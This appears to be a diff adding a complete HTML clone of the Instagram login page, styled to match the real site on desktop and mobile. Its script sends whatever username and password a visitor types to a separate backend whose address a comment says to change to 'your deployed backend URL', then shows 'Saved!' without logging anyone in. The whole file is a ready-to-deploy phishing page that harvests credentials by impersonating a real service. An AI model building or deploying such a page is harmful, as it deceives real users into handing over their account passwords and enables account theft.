@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login • Instagram</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ig-blue: #0095f6;
+      --ig-link: #00376b;
+      --ig-border: #dbdbdb;
+      --ig-input-bg: #fafafa;
+      --ig-text: #262626;
+    }
+    html, body { min-height: 100%; }
+    body {
+      background: #fafafa;
+      color: var(--ig-text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .ig-wrap { width: 100%; max-width: 350px; padding: 12px; }
+
+    /* Cards (desktop look) */
+    .ig-card {
+      background: #fff;
+      border: 1px solid var(--ig-border);
+      border-radius: 1px;
+      padding: 10px 40px;
+      margin-bottom: 10px;
+    }
+    .ig-main { padding-top: 36px; padding-bottom: 28px; }
+
+    .ig-logo {
+      font-family: "Grand Hotel", cursive;
+      font-size: 3.4rem;
+      text-align: center;
+      line-height: 1;
+      margin: 0 0 28px;
+      color: #262626;
+    }
+
+    .ig-input {
+      background: var(--ig-input-bg);
+      border: 1px solid var(--ig-border);
+      border-radius: 3px;
+      font-size: .8rem;
+      padding: 10px 8px;
+      margin-bottom: 6px;
+    }
+    .ig-input:focus {
+      background: var(--ig-input-bg);
+      border-color: #a8a8a8;
+      box-shadow: none;
+    }
+
+    .ig-btn {
+      background: var(--ig-blue);
+      border: 0;
+      color: #fff;
+      font-weight: 600;
+      font-size: .9rem;
+      border-radius: 8px;
+      padding: 7px 16px;
+      margin-top: 8px;
+    }
+    .ig-btn:hover, .ig-btn:focus { background: #1877f2; color: #fff; }
+    .ig-btn:disabled { background: var(--ig-blue); opacity: .3; color: #fff; }
+
+    .ig-forgot {
+      display: block;
+      text-align: center;
+      font-size: .75rem;
+      color: var(--ig-link);
+      text-decoration: none;
+      margin-top: 18px;
+    }
+    .ig-signup { text-align: center; font-size: .9rem; padding: 20px; }
+    .ig-signup a { color: var(--ig-blue); font-weight: 600; text-decoration: none; }
+
+    .ig-getapp { text-align: center; font-size: .9rem; margin: 14px 0; }
+    .ig-stores { display: flex; justify-content: center; gap: 8px; }
+    .store-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #000;
+      color: #fff;
+      border: 1px solid #a6a6a6;
+      border-radius: 6px;
+      padding: 5px 12px;
+      text-decoration: none;
+      height: 44px;
+      min-width: 135px;
+    }
+    .store-btn:hover { color: #fff; }
+    .store-btn svg { width: 22px; height: 22px; fill: #fff; flex-shrink: 0; }
+    .store-btn small { display: block; font-size: .55rem; line-height: 1; letter-spacing: .3px; }
+    .store-btn strong { display: block; font-size: 1rem; line-height: 1.1; font-weight: 500; }
+
+    /* ---------- Mobile view: focus here ---------- */
+    @media (max-width: 575.98px) {
+      body {
+        background: #fff;
+        align-items: flex-start;
+        padding-top: env(safe-area-inset-top, 0);
+      }
+      .ig-wrap { max-width: 100%; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }
+
+      /* remove boxes, let content breathe full width */
+      .ig-card { border: 0; padding-left: 28px; padding-right: 28px; margin-bottom: 0; background: transparent; }
+      .ig-main { padding-top: 72px; flex: 1; }
+      .ig-logo { font-size: 3.6rem; margin-bottom: 36px; }
+
+      .ig-input { font-size: 1rem; padding: 14px 12px; margin-bottom: 10px; border-radius: 6px; } /* 16px stops iOS zoom */
+      .ig-btn { font-size: 1rem; padding: 12px 16px; margin-top: 12px; border-radius: 10px; }
+      .ig-forgot { font-size: .9rem; margin-top: 24px; }
+
+      /* sign-up becomes a bottom bar */
+      .ig-signup {
+        border-top: 1px solid var(--ig-border);
+        padding: 18px;
+        font-size: 1rem;
+        background: #fff;
+      }
+      .ig-getapp { margin: 18px 0 14px; font-size: .95rem; }
+      .ig-stores { padding-bottom: calc(24px + env(safe-area-inset-bottom, 0)); }
+      .store-btn { flex: 1; max-width: 165px; min-width: 0; justify-content: center; }
+    }
+
+    @media (max-width: 360px) {
+      .ig-card { padding-left: 18px; padding-right: 18px; }
+      .store-btn { padding: 5px 8px; }
+      .store-btn strong { font-size: .9rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="ig-wrap">
+
+    <!-- Login card -->
+    <main class="ig-card ig-main">
+      <h1 class="ig-logo">Instagram</h1>
+
+      <form id="loginForm" novalidate>
+        <input type="text" class="form-control ig-input" id="username"
+               placeholder="Phone number, username, or email"
+               autocomplete="username" autocapitalize="none" autocorrect="off" aria-label="Phone number, username, or email">
+        <input type="password" class="form-control ig-input" id="password"
+               placeholder="Password" autocomplete="current-password" aria-label="Password">
+        <button type="submit" class="btn ig-btn w-100" id="loginBtn" disabled>Log in</button>
+      </form>
+
+      <a href="#" class="ig-forgot">Forgot password?</a>
+    </main>
+
+    <!-- Sign up card -->
+    <div class="ig-card ig-signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <!-- Get the app -->
+    <div class="ig-getapp">Get the app.</div>
+    <div class="ig-stores">
+      <a href="#" class="store-btn" aria-label="Download on the App Store">
+        <svg viewBox="0 0 384 512" aria-hidden="true"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>
+        <span><small>Download on the</small><strong>App Store</strong></span>
+      </a>
+      <a href="#" class="store-btn" aria-label="Get it on Google Play">
+        <svg viewBox="0 0 512 512" aria-hidden="true"><path d="M325.3 234.3L104.6 13l280.8 161.2-60.1 60.1zM47 0C34 6.8 25.3 19.2 25.3 35.3v441.3c0 16.1 8.7 28.5 21.7 35.3l256.6-256L47 0zm425.2 225.6l-58.9-34.1-65.7 64.5 65.7 64.5 60.1-34.1c18-14.3 18-46.5-1.2-60.8zM104.6 499l280.8-161.2-60.1-60.1L104.6 499z"/></svg>
+        <span><small>GET IT ON</small><strong>Google Play</strong></span>
+      </a>
+    </div>
+
+  </div>
+
+  <script>
+    const user = document.getElementById('username');
+    const pass = document.getElementById('password');
+    const btn  = document.getElementById('loginBtn');
+
+    // Enable Log in only when both fields are filled (like Instagram)
+    function toggleBtn() {
+      btn.disabled = !(user.value.trim() && pass.value.length >= 6);
+    }
+    user.addEventListener('input', toggleBtn);
+    pass.addEventListener('input', toggleBtn);
+
+    const API_URL = 'http://localhost:5000/api/login'; // change to your deployed backend URL
+
+    document.getElementById('loginForm').addEventListener('submit', async e => {
+      e.preventDefault();
+      btn.disabled = true;
+      btn.textContent = 'Logging in...';
+
+      try {
+        const res = await fetch(API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: user.value.trim(), password: pass.value }),
+        });
+        const data = await res.json();
+
+        if (res.ok) {
+          btn.textContent = 'Log in';
+          alert('Saved! Welcome, ' + data.username);
+          document.getElementById('loginForm').reset();
+        } else {
+          btn.textContent = 'Log in';
+          alert(data.message || 'Something went wrong');
+        }
+      } catch (err) {
+        console.error(err);
+        btn.textContent = 'Log in';
+        alert('Could not reach the server. Is it running?');
+      } finally {
+        toggleBtn();
+      }
+    });
+  </script>
+</body>
+</html>
